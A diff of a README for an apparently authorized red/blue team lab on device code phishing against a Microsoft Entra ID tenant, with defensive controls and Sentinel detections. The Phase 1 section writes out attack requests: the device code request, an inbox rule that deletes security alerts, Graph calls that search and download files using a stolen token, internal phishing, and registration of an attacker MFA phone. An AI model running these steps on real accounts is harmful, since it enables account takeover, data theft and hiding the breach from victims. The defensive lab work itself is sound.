@@ -1,8 +1,8 @@
 # Device Code Flow Attack — Microsoft Entra ID Lab
 
-**Organization:** Eag(xxx)cureIT  
-**Tenant:** eagle(xxx)ureit.com  
-**Lab Date:** April 2026  
+**Organization:** EaglXXXeIT  
+**Tenant:** eaglXXXeit.com  
+**Lab Date:** April 14 – April 19, 2026  
 **Type:** Red Team / Blue Team Simulation
 
 ---
@@ -43,128 +43,261 @@ Before getting into the technical details, it is worth understanding what a succ
 
 ### What an Attacker Can Do With One Stolen Token
 
-If the controls in this lab were not deployed, here is exactly what the attacker could do from the moment they receive the token:
-
 **Hour 1 — Establish foothold**
 - Read all emails in the victim's inbox going back years
-- Create inbox rules to silently delete Microsoft security alert emails so the victim never notices the breach
+- Create inbox rules to silently delete Microsoft security alert emails so the victim never notices
 - Register their own phone number as an MFA method so they keep access even after a password reset
 
 **Hour 2 — Lateral movement**
-- Send internal phishing emails to colleagues, executives, and finance teams — appearing to come from a trusted internal sender with no suspicious indicators
-- Access SharePoint and Teams channels for internal documents, stored credentials, network diagrams, and financial records
+- Send internal phishing emails to colleagues, executives, and finance teams appearing to come from a trusted internal sender
+- Access SharePoint and Teams for internal documents, credentials, network diagrams, and financial records
 
 **Hour 3 — Escalation**
-- Search the victim's email history for passwords, VPN credentials, and banking information
-- If the victim has admin rights — access other user accounts, disable security controls, and create persistent backdoor accounts
-- Deploy ransomware across the environment or sell verified access to other threat actors
+- Search emails for passwords, VPN credentials, and banking information
+- If victim has admin rights — access other accounts, disable security controls, create backdoor accounts
+- Deploy ransomware or sell verified access to other threat actors
 
-The average cost of a data breach in Canada in 2024 was **$6.32 million CAD**. A single compromised account left undetected for 24 hours can lead to full domain compromise. Device code flow attacks have been directly attributed to real-world breaches by threat actor groups including **Storm-2372**, which Microsoft Threat Intelligence documented actively targeting enterprises and government organizations using this exact technique.
+The average cost of a data breach in Canada in 2024 was **$6.32 million CAD**. Device code flow attacks have been directly attributed to real-world breaches by threat actor groups including **Storm-2372**.
 
 ---
 
-## Lab Results at a Glance
+## Lab Timeline
 
-| | Phase 1 — No Defenses | Phase 2 — Defended |
-|---|---|---|
-| Token issued to attacker | ✅ Yes - full access obtained | ❌ No — blocked at issuance |
-| Device code status | SUCCESS | EXPIRED |
-| Sign-in detection | Nothing fired | Defender for Cloud Apps alerted |
-| Attacker IP logged | Not captured | 17X.81.2XX.XXX — Arizona, US |
-| Sentinel alert | No rule matched | FAILURE logged — gap identified and fixed |
-| Account status | Active and accessible | Auto-disabled by Identity Protection |
-| Post-compromise actions | All possible | All prevented — no token, no access |
+| Date | Activity |
+|---|---|
+| April 14, 2026 | Phase 1 — attack simulated with no defenses, token obtained |
+| April 14–18, 2026 | Security controls researched, planned, and deployed |
+| April 19, 2026 | Phase 2 — attack re-simulated with full defense stack active |
+| April 19, 2026 | Incident response — attacker IP logged, account auto-disabled |
 
 ---
 
 ## Attack Flow
 
 ```
-Attacker                          Victim                        Microsoft
-   │                                 │                               │
-   │── POST /devicecode ────────────────────────────────────────────▶│
-   │◀─ user_code: F2GGN3XXX ────────────────────────────────────────│
-   │                                 │                               │
-   │── "Enter this code" ───────────▶│                               │
-   │                                 │── goes to devicelogin ───────▶│
-   │                                 │── enters F2GGN3YVQ ──────────▶│
-   │                                 │── completes MFA ─────────────▶│
-   │                                 │                               │
-   │── POST /token (polling) ───────────────────────────────────────▶│
-   │◀─ access_token + refresh_token ────────────────────────────────│
-   │                                                                  │
-   │── GET /me, /messages, /drive (as victim) ──────────────────────▶│
+Attacker                         Victim                        Microsoft
+   │                                │                               │
+   │── POST /devicecode ───────────────────────────────────────────▶│
+   │◀─ user_code: F2GGN3YVQ ───────────────────────────────────────│
+   │                                │                               │
+   │── "Enter this code" ──────────▶│                               │
+   │                                │── goes to devicelogin ───────▶│
+   │                                │── enters code ───────────────▶│
+   │                                │── completes MFA ─────────────▶│
+   │                                │                               │
+   │── POST /token (polling) ──────────────────────────────────────▶│
+   │◀─ access_token + refresh_token ───────────────────────────────│
 ```
-
-The victim authenticates on Microsoft's real infrastructure. The attacker collects the token from a completely separate machine. The two never interact directly.
-
-
-<img width="1300" height="350" alt="image" src="https://github.com/user-attachments/assets/ba9be557-840b-4f5b-b96b-a2777daf941c" />
 
 ---
 
-## Controls Deployed in Phase 2
+## Phase 1 — Attack With No Defenses (April 14, 2026)
+
+No Conditional Access policies were targeting device code flow. No Identity Protection risk policies were enforced. No Defender for Cloud Apps behavioral policies were active. The tenant was in its default state.
+
+### Step 1 — Attacker Requests a Device Code
+
+```bash
+POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
+client_id = d35XXXd6-XXX-4102-XXXX-aad2292abXXX
+scope     = openid profile email offline_access https://graph.microsoft.com/.default
+```
+
+Microsoft responded with user code `F2GGN3XXX` and a 15-minute window for the victim to authenticate.
+
+### Step 2 — Victim Enters the Code
+
+The victim was directed to `https://microsoft.com/devicelogin` and entered the code. Microsoft displays a warning telling users not to enter codes from untrusted sources — in most real-world cases this warning is ignored.
+
+<img width="1200" height="834" alt="image" src="https://github.com/user-attachments/assets/25734385-9a6d-419c-bef1-285298bc0450" />
+
+### Step 3 — Attacker Receives the Token
+
+While the victim authenticated normally, the attacker's tool polled the token endpoint every 5 seconds. The moment the victim completed their login, Microsoft handed the token to the attacker.
+
+![Device Code List showing STATUS: SUCCESS](screenshots/02-device-code-success.png)
+
+The attack took **2 minutes and 28 seconds** from code generation to token receipt. Status shows `SUCCESS` in green. The attacker now holds a valid `access_token` and `refresh_token` for the victim's account.
+
+At this point — no alerts fired. No CA policies triggered. No Sentinel rules matched. The sign-in logs showed a normal successful authentication. The attack was completely silent.
+
+### Post-Compromise Actions
+
+With a valid token, the following attacker actions were simulated to document the full blast radius:
+
+**Inbox rule creation — hiding security alerts**
+
+```powershell
+New-InboxRule -Name "System Update" `
+  -SubjectContainsWords "Microsoft account","unusual sign","security alert" `
+  -DeleteMessage $true
+```
+
+Any Microsoft security notification sent to the victim is now silently deleted before they can read it.
+
+**Sensitive file download — data exfiltration**
+
+```bash
+GET https://graph.microsoft.com/v1.0/me/drive/root/children
+GET https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')
+GET https://graph.microsoft.com/v1.0/me/drive/items/{id}/content
+Authorization: Bearer [STOLEN_TOKEN]
+```
+
+**Internal phishing — lateral movement**
+
+```bash
+POST https://graph.microsoft.com/v1.0/me/sendMail
+Authorization: Bearer [STOLEN_TOKEN]
+
+{
+  "message": {
+    "subject": "Action Required: Please Review This Document",
+    "toRecipients": [{ "emailAddress": { "address": "cfo@eaglesecureit.com" } }]
+  }
+}
+```
+
+Sent from a legitimate internal account. No suspicious sender. No phishing indicators.
+
+**MFA method registration — persistence**
+
+```bash
+POST https://graph.microsoft.com/v1.0/me/authentication/phoneMethods
+Authorization: Bearer [STOLEN_TOKEN]
+
+{ "phoneNumber": "+1-555-0199", "phoneType": "mobile" }
+```
+
+Attacker's number registered as an MFA factor. Survives a password reset.
+
+---
+
+## Phase 2 — Security Controls Deployed (April 14–18, 2026)
 
 ### Conditional Access Policies — 8 Policies, All Enforced
 
+![All 8 Conditional Access policies — State: On](screenshots/06-ca-policies-list.png)
+
 | Policy | Purpose |
 |---|---|
-| All Users — Device Code Flow — Block Access | Blocks the device code protocol entirely at the CA layer |
-| All Users — Require Token Protection | Binds tokens to the enrolled device — prevents token replay on attacker machine |
-| All Users — Sign In Risk — Block Access | Integrates with Identity Protection to block risky sign-ins |
+| All Users — Device Code Flow — Block Access | Blocks the device code protocol at the CA layer |
+| All Users — Require Token Protection | Binds tokens to the enrolled device — prevents replay on attacker machine |
+| All Users — Sign In Risk — Block Access | Blocks risky sign-ins via Identity Protection integration |
 | All Users — All Apps — Require Strong MFA | Enforces phishing-resistant MFA across all applications |
-| All Users — Device Registrations — Require MFA | Blocks attacker from registering their own MFA method post-compromise |
+| All Users — Device Registrations — Require MFA | Prevents attacker from registering their own MFA method |
 | All Users — Legacy Auth Clients — Block Access | Blocks older protocols that bypass MFA |
 | Block Login From External Corporate Network | Restricts sign-ins from outside trusted IP ranges |
 | Corporate Network — MFA Required To Login | Requires MFA even inside the corporate network |
 
 ### Named Locations
-Trusted IP ranges defined as "Corporate Network - Trusted" and referenced by CA policies. Sign-ins from outside these ranges are treated as higher risk and feed into Identity Protection scoring.
 
-<img width="1300" height="590" alt="image" src="https://github.com/user-attachments/assets/4b236adc-1723-48f4-83d3-504c9ca2fe5a" />
+![Named Locations — Corporate Network - Trusted](screenshots/07-named-locations.png)
+
+Trusted IP ranges defined as `Corporate Network - Trusted` and marked as a trusted location. Any authentication from outside these ranges feeds into Identity Protection risk scoring and triggers additional CA controls.
 
 ### Microsoft Defender for Cloud Apps
+
+Three policies configured:
 - **Device Code Auth - Anomalous Location** — Custom activity policy alerting on native client logons from outside Canada
-- **Impossible Travel** — Built-in anomaly detection, sensitivity set to High
-- **Mass Download by Single User** — Built-in anomaly detection for bulk file exfiltration, sensitivity set to High
+- **Impossible Travel** — Built-in anomaly detection, sensitivity High
+- **Mass Download by Single User** — Built-in detection for bulk file exfiltration, sensitivity High
 
 ### Microsoft Sentinel — KQL Detection Rules
-- Rule 1: Alert on successful device code authentication (ResultType == 0)
-- Rule 2: Alert on blocked device code attempts — gap fix identified during Phase 2 testing
-- Rule 3: Alert on inbox rule creation matching security alert keywords
-- Rule 4: Alert on new MFA method registration
 
-### Microsoft Entra Identity Protection
-Sign-in risk policy set to block on Medium and High risk. Automatically disabled the target account after the Phase 2 attack attempt.
+Four analytics rules deployed covering successful device code authentications, blocked attempts, inbox rule creation, and new MFA method registrations. See [`detections/sentinel-rules.kql`](detections/sentinel-rules.kql) for all queries.
 
 ### Privileged Identity Management
-All privileged roles converted from permanent active assignment to eligible — requiring just-in-time activation with MFA and justification.
+
+All privileged roles converted from permanent active assignment to eligible — requiring just-in-time activation with MFA and justification before admin rights become active.
 
 ---
 
-## Post-Compromise Actions Documented
+## Phase 2 — Attack Re-Simulation (April 19, 2026)
 
-These are the actions an attacker performs after obtaining a token. They are documented here to show the full blast radius of a successful compromise and to validate that detection rules for each action are in place.
+The exact same attack was repeated with all controls active. Same tool. Same client ID. Same target account.
 
-**Inbox rule creation** — Attacker creates rules to silently delete or move Microsoft security alert emails before the victim sees them. Detected by Sentinel OfficeActivity rule monitoring New-InboxRule operations.
+### What the Victim Saw
 
-**Sensitive file download** — Attacker uses Graph API to enumerate and bulk download OneDrive and SharePoint files. Detected by Defender for Cloud Apps Mass Download policy.
+The victim entered the new device code and attempted to authenticate. This time, instead of completing successfully, Microsoft returned:
 
-**Internal phishing — lateral movement** — Attacker sends phishing emails from the victim's mailbox to other employees. Trusted internal sender bypasses most email filters. Detected by Defender for Cloud Apps mail anomaly detection.
+![Microsoft blocks the token — device not managed by EagleSecureIT](screenshots/01-browser-blocked.png)
 
-**MFA method registration** — Attacker registers their own phone or authenticator app under the victim's account, surviving a password reset. Prevented by the Device Registrations CA policy and detected by Sentinel AuditLogs rule.
+> *Your sign-in was successful but your admin requires the device requesting access to be managed by EagleSecureIT to access this resource.*
+
+The victim's credentials were correct. Their MFA passed. But the token was refused because the device initiating the request — the attacker's unmanaged machine — was not enrolled in the tenant. The Token Protection CA policy blocked issuance at the final step.
+
+### What the Attacker Saw
+
+The attacker's tool continued polling for 15 minutes. It never received a token.
+
+![Device Code List showing STATUS: EXPIRED](screenshots/02-device-code-expired.png)
+
+Phase 1 — green — `SUCCESS`. Phase 2 — red — `EXPIRED`. The attacker got nothing.
+
+### What Sentinel Logged
+
+```kql
+SigninLogs
+| where TimeGenerated > ago(1h)
+| where UserPrincipalName contains "johnsmith"
+| project TimeGenerated, IPAddress, Location, ResultSignature, AppDisplayName
+```
+
+![Sentinel KQL results — FAILURE — IP 172.81.60.237](screenshots/03-sentinel-kql-failure.png)
+
+| Field | Value |
+|---|---|
+| TimeGenerated | Apr 19, 2026 2:11:19 |
+| IPAddress | 172.81.60.237 |
+| Location | US |
+| ResultSignature | FAILURE |
+| AppDisplayName | Microsoft Office |
+
+The attacker's IP is now a documented indicator of compromise. Location shows United States, Arizona — outside the trusted Canada perimeter.
+
+An enhanced query adding `AuthenticationProtocol` returned a value of `none` rather than `deviceCode`:
+
+![Enhanced Sentinel query — AuthenticationProtocol: none](screenshots/04-sentinel-enhanced.png)
+
+This is expected when CA blocks early in the pipeline — the protocol field is never populated. This led to the detection gap finding documented below.
+
+### What Defender for Cloud Apps Captured
+
+![Defender for Cloud Apps — failed logon alert with full attacker detail](screenshots/05-defender-alert.png)
+
+| Field | Value |
+|---|---|
+| Activity | Failed log on |
+| User | john smith |
+| Date | Apr 19, 2026 2:09 PM |
+| IP Address | 172.81.60.237 |
+| Location | United States, Arizona |
+| Device | PC, OS X 10, Chrome 144.0 |
+| ISP | dynu systems incorporated |
+| Matched policies | Policies matched |
+
+The attacker's machine was fingerprinted. ISP flagged as a dynamic DNS provider — consistent with attack tooling or VPN use.
+
+### Account Auto-Disabled
+
+Identity Protection evaluated the sign-in risk and automatically disabled the johnsmith account as a response action. This was confirmed when an RDP connection to the environment returned:
+
+![RDP connection error — account disabled — Error 0xb07](screenshots/08-account-disabled.png)
+
+> *We couldn't connect to the remote PC because your account has been disabled. Error code: 0xb07*
+
+The account was re-enabled by the administrator after confirming the attack was contained.
 
 ---
 
 ## Detection Gap Found and Fixed
 
-During Phase 2 testing, a gap was identified in the Sentinel detection rules.
+The original Sentinel rule used `where ResultType == 0` — success only. Because the CA policy blocked the Phase 2 attack before a token was issued, the result was a failure code, and no alert fired.
 
-The original rule used `where ResultType == 0` which only fires on successful authentications. Because the CA policy blocked the Phase 2 attack before a token was issued, the sign-in logged as a failure — and no Sentinel alert fired.
+This means blocked attacks were completely invisible to the SIEM. The security team would not know they were being targeted.
 
-This means the security team would have had zero visibility into the blocked attack attempt. Blocked attempts matter — they are early warning signals that an attacker is actively targeting accounts.
-
-**The fix — updated rule covering both outcomes:**
+**Fixed rule — covers both outcomes:**
 
 ```kql
 SigninLogs
@@ -183,60 +316,38 @@ SigninLogs
 
 ---
 
-## Evidence
+## Before vs After
 
-### Phase 1 — No Defenses
-
-| Screenshot | What It Shows |
-|---|---|
-| 01-devicelogin-prompt.png | microsoft.com/devicelogin — victim-side code entry page |
-| 02-device-code-success.png | Attacker tool — User code F2GGN3YVQ — Status: **SUCCESS** |
-
-### Phase 2 — Defended
-
-| Screenshot | What It Shows |
-|---|---|
-| 01-browser-blocked.png | "Help us keep your device secure" — token refused, device not managed |
-| 02-device-code-expired.png | Attacker tool — Status: **EXPIRED** — no token issued |
-| 03-sentinel-kql-failure.png | Sentinel log — IP 172.81.60.237, Location US, ResultSignature: FAILURE |
-| 04-sentinel-enhanced.png | Enhanced query — AuthenticationProtocol: none — early CA block behavior |
-| 05-defender-alert.png | Defender for Cloud Apps — failed logon, attacker device fingerprinted |
-| 06-ca-policies-list.png | All 8 CA policies — State: On |
-| 07-named-locations.png | Corporate Network - Trusted — IP ranges, Trusted: Yes |
-| 08-account-disabled.png | RDP Error 0xb07 — account auto-disabled by Identity Protection |
+| | April 14 — No Defenses | April 19 — Defended |
+|---|---|---|
+| Token issued | ✅ Yes — full access | ❌ No — blocked |
+| Device code status | SUCCESS | EXPIRED |
+| Inbox rules created | Possible | Prevented |
+| Files downloaded | Possible | Prevented |
+| Internal phishing sent | Possible | Prevented |
+| MFA method registered | Possible | Prevented |
+| Attacker IP captured | No | 172.81.60.237 — Arizona, US |
+| Sentinel alert | None | FAILURE logged |
+| Defender alert | None | Failed logon — attacker fingerprinted |
+| Account status | Active | Auto-disabled by Identity Protection |
 
 ---
 
-## Repo Structure
+## Recommendations
 
-```
-device-code-lab/
-├── README.md
-├── docs/
-│   ├── attack-explained.md      How device code flow works
-│   ├── phase1-attack.md         Phase 1 full walkthrough
-│   ├── phase2-defense.md        Every control deployed and why
-│   ├── phase2-results.md        What happened when defenses were active
-│   ├── gap-analysis.md          Detection gap found and fixed
-│   └── recommendations.md       Priority-ordered production guidance
-├── detections/
-│   ├── sentinel-rules.kql       All KQL analytics rules
-│   └── defender-policies.md     Defender for Cloud Apps configurations
-├── evidence/
-│   ├── phase1/                  Phase 1 screenshots
-│   └── phase2/                  Phase 2 screenshots
-└── scripts/
-    └── simulate-attack.md       Attack commands reference
-```
+| Priority | Control | Effort |
+|---|---|---|
+| 1 | Block device code flow via Conditional Access | Low |
+| 2 | Enable Token Protection CA policy | Low |
+| 3 | Update Sentinel rules to cover blocked attempts | Low |
+| 4 | Configure Named Locations with trusted IP ranges | Low |
+| 5 | Enable Continuous Access Evaluation (CAE) | Low |
+| 6 | Convert privileged roles to PIM eligible assignments | Medium |
+| 7 | Disable device code flow at tenant level if no legitimate use | Medium |
+| 8 | Deploy Defender for Cloud Apps behavioral policies | Medium |
+| 9 | Move privileged accounts to FIDO2 / Passkeys | High |
+| 10 | Re-run this simulation every 6 months | Low |
 
 ---
 
-## Key Takeaway
-
-The same attack that took under 3 minutes to succeed in Phase 1 was completely stopped in Phase 2 — with the attacker's IP, device, location, and ISP all logged as evidence. The security stack did not just block the attack. It documented it.
-
-The gap analysis added additional value beyond the initial lab objective by identifying that detection and prevention need to be tested together. A control that blocks an attack silently, with no corresponding alert, leaves the security team blind to the fact that they are being targeted.
-
----
-
-> **Disclaimer:** This lab was conducted against an authorized test environment. All simulation activity was performed on accounts and systems owned by the lab operator. Do not replicate this against any environment you do not have explicit written authorization to test.
+> **Disclaimer:** This lab was conducted against an authorized test environment. All activity was performed on accounts and systems owned by the lab operator. Do not replicate against any environment without explicit written authorization.
